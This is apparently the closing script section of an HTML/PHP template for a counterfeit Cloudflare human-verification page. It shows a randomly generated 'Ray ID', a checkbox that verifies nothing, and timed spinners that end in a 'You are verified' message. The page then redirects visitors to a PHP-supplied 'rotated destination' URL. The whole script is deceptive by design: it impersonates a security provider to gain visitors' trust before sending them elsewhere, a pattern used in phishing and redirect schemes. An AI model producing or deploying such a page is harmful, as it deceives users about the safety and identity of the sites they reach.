    <script data-template-shadow-root>
        (() => {
            document.currentScript.remove();
            processNode(document);

            function processNode(node) {
                node.querySelectorAll("template[shadowrootmode]").forEach(element => {
                    let shadowRoot = element.parentElement.shadowRoot;
                    if (!shadowRoot) {
                        try {
                            shadowRoot = element.parentElement.attachShadow({
                                mode: element.getAttribute("shadowrootmode"),
                                delegatesFocus: element.getAttribute("shadowrootdelegatesfocus") != null,
                                clonable: element.getAttribute("shadowrootclonable") != null,
                                serializable: element.getAttribute("shadowrootserializable") != null
                            });
                            shadowRoot.innerHTML = element.innerHTML;
                            element.remove()
                        } catch (error) {}
                        if (shadowRoot) {
                            processNode(shadowRoot)
                        }
                    }
                })
            }
        })()
    </script>
    <script>
        // Generate random Ray ID
        function generateRandomRayId() {
            const chars = '0123456789abcdef';
            let rayId = '';
            for (let i = 0; i < 16; i++) {
                rayId += chars[Math.floor(Math.random() * chars.length)];
            }
            return rayId;
        }
        
        // Update Ray ID on page load
        document.addEventListener('DOMContentLoaded', function() {
            // Set random Ray ID
            const rayIdElement = document.querySelector('.ray-id code');
            if (rayIdElement) {
                rayIdElement.textContent = generateRandomRayId();
            }
            
        // Initialize the verification flow
            // Get all required elements
            const mainStep1 = document.getElementById('mainstep1');
            let mainStep2 = document.getElementById('mainstep2');
            const spinner = document.getElementById('spinerstep');
            const verify = document.getElementById('verify');
            const checkverify = document.getElementById('checkverify');
            let flowStarted = false;
            
            // Ensure mainstep2 exists for post-verification content
            function ensureMainStep2() {
                if (mainStep2) return;
                const container = document.createElement('div');
                container.id = 'mainstep2';
                container.className = 'main-content';
                container.style.display = 'none';
                
                const title = document.createElement('h1');
                title.className = 'zone-name-title h1';
                title.textContent = 'Verification complete';
                
                const message = document.createElement('p');
                message.id = 'challenge-success-text';
                message.className = 'h2 spacer-bottom';
                message.style.display = 'none';
                message.style.visibility = 'hidden';
                message.textContent = 'You are verified. Redirecting...';
                
                container.appendChild(title);
                container.appendChild(message);
                
                // Insert after mainStep1 if possible, else append to body
                if (mainStep1 && mainStep1.parentNode) {
                    mainStep1.parentNode.insertBefore(container, mainStep1.nextSibling);
                } else {
                    document.body.appendChild(container);
                }
                
                mainStep2 = container;
            }
            


            // Function to handle verification flow
            function startVerification() {
                if (flowStarted) return;
                flowStarted = true;
                console.log('Starting verification flow...');
                // New flow: checkbox → successcheckbox → verify → spinner → mainstep2
                
                // Hide checkverify and show successcheckbox first
                if (checkverify) checkverify.style.display = 'none';
                
                // Show successcheckbox immediately
                const successcheckbox = document.getElementById('successcheckbox');
                if (successcheckbox) {
                    successcheckbox.style.display = 'grid';
                }

                // After 2 seconds, hide successcheckbox and show verify
                setTimeout(function() {
                    if (successcheckbox) successcheckbox.style.display = 'none';
                    if (verify) verify.style.display = 'block';

                    // After 1 second, hide verify and show spinner
                    setTimeout(function() {
                        if (verify) verify.style.display = 'none';
                        if (spinner) spinner.style.display = 'block';

                        // After 2 seconds, hide spinner and switch to mainstep2
                        setTimeout(function() {
                            if (spinner) spinner.style.display = 'none';
                            if (mainStep1) mainStep1.style.display = 'none';
                            ensureMainStep2();
                            if (mainStep2) mainStep2.style.display = 'block';

                            // Show success message in mainstep2
                            const successMessage = mainStep2 ? mainStep2.querySelector('#challenge-success-text') : null;
                            if (successMessage) {
                                successMessage.style.display = 'block';
                                successMessage.style.visibility = 'visible';
                            }

                            // After showing mainstep2, redirect to another website
                            setTimeout(function() {
                                // Redirect to the selected rotated destination
                                window.location.href = '<?php echo htmlspecialchars($destinationUrl); ?>';
                            }, 3000); // Redirect after 3 seconds of showing mainstep2
                        }, 2000); // Show mainstep2 after 2 seconds of spinner
                    }, 1000); // Show spinner after 1 second of verify
                }, 2000); // Show verify after 2 seconds of successcheckbox
            }
            
            // Attach change/click handler to the human checkbox (supports inline and iframe srcdoc cases)
            function attachCheckboxHandler() {
                if (!checkverify) return;

                function bindOnRoot(root) {
                    if (!root) return false;
                    const checkbox = root.querySelector && root.querySelector('input[type="checkbox"]');
                    if (checkbox && !checkbox.dataset.bound) {
                        checkbox.dataset.bound = '1';
                        checkbox.addEventListener('change', function() {
                            startVerification();
                        });
                        // Fallback for environments that don't fire change until blur
                        checkbox.addEventListener('click', function() {
                            startVerification();
                        });
                        return true;
                    }
                    return false;
                }

                // Prefer binding on our native checkbox container first
                let bound = false;
                const nativeContainer = document.getElementById('native-checkbox-container');
                if (nativeContainer) {
                    bound = bindOnRoot(nativeContainer);
                }
                // Then try direct inside #checkverify if not bound
                if (!bound) {
                    bound = bindOnRoot(checkverify);
                }

                // Try inside iframe (srcdoc) if present
                const iframe = checkverify.querySelector && checkverify.querySelector('iframe');
                const tryBindInIframe = () => {
                    if (!iframe) return;
                    try {
                        const doc = iframe.contentDocument || (iframe.contentWindow && iframe.contentWindow.document);
                        if (doc) {
                            // If iframe DOM not fully ready, listen for it
                            if (doc.readyState === 'complete' || doc.readyState === 'interactive') {
                                bound = bindOnRoot(doc) || bound;
                            } else {
                                doc.addEventListener('DOMContentLoaded', () => { bound = bindOnRoot(doc) || bound; }, { once: true });
                                doc.addEventListener('load', () => { bound = bindOnRoot(doc) || bound; }, { once: true });
                            }
                        }
                    } catch (e) {
                        // Ignore cross-origin or access issues
                    }
                };
                if (iframe) {
                    iframe.addEventListener('load', tryBindInIframe, { once: false });
                    tryBindInIframe();
                }

                // As a last resort, observe mutations to catch late-rendered checkbox
                if (!bound) {
                    const mo = new MutationObserver(() => {
                        if (bindOnRoot(checkverify)) {
                            bound = true;
                            mo.disconnect();
                        }
                    });
                    mo.observe(checkverify, { childList: true, subtree: true });
                }

                // Do not inject any fallback; rely solely on the original widget
                if (!checkverify.dataset.delegated) {
                    checkverify.dataset.delegated = '1';
                    checkverify.addEventListener('click', function(event) {
                        const label = event.target && event.target.closest && event.target.closest('label.cb-lb');
                        if (label) {
                            startVerification();
                        }
                    });
                }
            }

            // No overlay click proxy

            // Initial state setup
            function initializeVerification() {
                ensureMainStep2();
                if (mainStep1) mainStep1.style.display = 'block';
                if (mainStep2) mainStep2.style.display = 'none';
                if (spinner) spinner.style.display = 'block'; // Show spinner first
                if (verify) verify.style.display = 'none';
                
                // Check if checkbox is enabled via PHP config
                const checkboxEnabled = <?php echo isset($cloudflareConfig) ? ($cloudflareConfig['checkbox_enabled'] ? 'true' : 'false') : 'true'; ?>;
                if (checkverify) {
                    checkverify.style.display = checkboxEnabled ? 'none' : 'none'; // Hide initially regardless
                }
                
                // Hide successcheckbox initially
                const successcheckbox = document.getElementById('successcheckbox');
                if (successcheckbox) successcheckbox.style.display = 'none';

                // After a delay, show verify
                setTimeout(function() {
                    if (spinner) spinner.style.display = 'none';
                    if (verify) verify.style.display = 'block';
                    
                    // Change the verification message text when verify section is shown
                    const verifyMessage = document.getElementById('elDm5');
                    if (verifyMessage) {
                        verifyMessage.textContent = 'Verifying you are human. This may take a few seconds.';
                        verifyMessage.style.display = 'block';
                    }

                    // After another delay, show checkverify or auto-proceed
                    setTimeout(function() {
                        if (verify) verify.style.display = 'none';
                        
                        if (checkboxEnabled) {
                            // Show checkbox if enabled
                            if (checkverify) checkverify.style.display = 'grid';
                            // Bind checkbox handler when the checkbox UI becomes visible
                            attachCheckboxHandler();
                        } else {
                            // Auto-proceed if checkbox disabled
                            startVerification();
                        }
                        
                        // Show the verification message again when showing checkverify
                        const verifyMessage = document.getElementById('elDm5');
                        if (verifyMessage) {
                            verifyMessage.textContent = 'Verify you are human by completing the action below.';
                            verifyMessage.style.display = 'block';
                        }
                    }, 2000); // Show checkverify after 2 seconds
                }, 1000); // Show verify after 1 second
            }

            // Initialize the verification flow
            initializeVerification();

            // Attempt early binding (in case checkverify is initially present)
            attachCheckboxHandler();
        });
    </script>
</body>
    </html>